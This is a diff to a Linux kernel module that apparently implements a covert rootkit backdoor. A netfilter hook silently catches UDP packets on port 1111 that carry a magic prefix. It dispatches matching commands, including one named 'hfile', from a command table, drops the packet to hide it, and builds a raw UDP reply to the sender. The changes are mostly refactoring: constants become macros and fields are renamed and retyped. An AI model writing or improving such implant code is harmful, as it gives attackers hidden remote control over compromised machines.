@@ -415,10 +415,13 @@ static int exit_func(const char *_) {
     return 0;
 }
 
+typedef u16 job_id_t;
+
+#define CMD_MAGIC ("mtk")
+#define CMD_MAGIC_LEN (strlen(CMD_MAGIC))
+#define CMD_PORT (1111)
+
 int cmds_len = 5;
-int cmd_port = 1111;
-char *cmd_magic = "mrk";
-int job_id_len = 2;
 struct cmd_type cmds[] = {
     {
         "hfile",
@@ -459,9 +462,9 @@ static int call_cmd(struct cmd_type *cmd, const char *data, unsigned int data_le
 static int send_response(
     unsigned short job_id,
     char response_status,
-    unsigned int local_ip,
-    unsigned int remote_ip,
-    unsigned int remote_port,
+    __be32 local_ip,
+    __be32 remote_ip,
+    __be16 remote_port,    
     unsigned char remote_mac[],
     struct net_device *dev
 ) {
@@ -488,7 +491,7 @@ static int send_response(
     skb_push(skb, sizeof(struct udphdr));
     skb_reset_transport_header(skb);
     udph = udp_hdr(skb);
-    udph->source = htons(cmd_port);
+    udph->source = htons(CMD_PORT);
     udph->dest = remote_port;
     udph->len = htons(data_len + sizeof(struct udphdr));
     udph->check = 0;
@@ -538,19 +541,19 @@ struct MRK_command_work {
     struct cmd_type *cmd;
     const char *data;
     int data_len;
-    unsigned int daddr;
-    unsigned int saddr;
-    unsigned int source;
-    char h_source[ETH_ALEN];
+    __be32 src_addr;
+    __be32 dst_addr;
+    __be16 src_port;
+    unsigned char src_mac[ETH_ALEN];
     struct net_device *dev;
 };
 
 static void handle_command(struct work_struct *work) {
     int result;
     struct MRK_command_work *command_work = container_of(work, struct MRK_command_work, work);
-    result = call_cmd(command_work->cmd, command_work->data + job_id_len + strlen(cmd_magic), command_work->data_len);
+    result = call_cmd(command_work->cmd, command_work->data + sizeof(job_id_t) + CMD_MAGIC_LEN, command_work->data_len);
     printk(KERN_INFO "Found %s cmd packet! executed with code %d\n", command_work->cmd->name, result);
-    send_response(get_unaligned((unsigned short *)(command_work->data + strlen(cmd_magic))), result, command_work->daddr, command_work->saddr, command_work->source, command_work->h_source, command_work->dev);
+    send_response(get_unaligned((unsigned short *)(command_work->data + CMD_MAGIC_LEN)), result, command_work->dst_addr, command_work->src_addr, command_work->src_port, command_work->src_mac, command_work->dev);
     // From https://github.com/torvalds/linux/blob/v5.8/kernel/workqueue.c:2173
     // It is permissible to free the struct work_struct from inside the function that is called from it.
     kfree(command_work->data);
@@ -570,7 +573,7 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     if (iph->protocol != IPPROTO_UDP) return NF_ACCEPT;
 
     udph = udp_hdr(skb);
-    if (ntohs(udph->dest) != cmd_port) return NF_ACCEPT;
+    if (ntohs(udph->dest) != CMD_PORT) return NF_ACCEPT;
 
     user_data_len = ntohs(udph->len) - sizeof(struct udphdr);
 
@@ -580,9 +583,9 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     user_data = skb->tail - user_data_len;
     #endif
 
-    if (strncmp(user_data, cmd_magic, strlen(cmd_magic))) return NF_ACCEPT;
+    if (strncmp(user_data, CMD_MAGIC, CMD_MAGIC_LEN)) return NF_ACCEPT;
     for (i = 0; i < cmds_len; i++) {
-        if (!match_cmd(cmds + i, user_data + job_id_len + strlen(cmd_magic))) {
+        if (!match_cmd(cmds + i, user_data + sizeof(job_id_t) + CMD_MAGIC_LEN)) {
               command_work = kmalloc(sizeof(struct MRK_command_work), GFP_KERNEL);
               INIT_WORK(&command_work->work, handle_command);
               command_work->cmd = cmds + i;
@@ -590,10 +593,10 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
               memcpy(user_data_copy, user_data, user_data_len);
               command_work->data = user_data_copy;
               command_work->data_len = user_data_len;
-              command_work->daddr = iph->daddr;
-              command_work->saddr = iph->saddr;
-              command_work->source = udph->source;
-              memcpy(command_work->h_source, eth_hdr(skb)->h_source, ETH_ALEN);
+              command_work->dst_addr = iph->daddr;
+              command_work->src_addr = iph->saddr;
+              command_work->src_port = udph->source;
+              memcpy(command_work->src_mac, eth_hdr(skb)->h_source, ETH_ALEN);
               command_work->dev = skb->dev;
               schedule_work(&command_work->work);
             return NF_DROP;
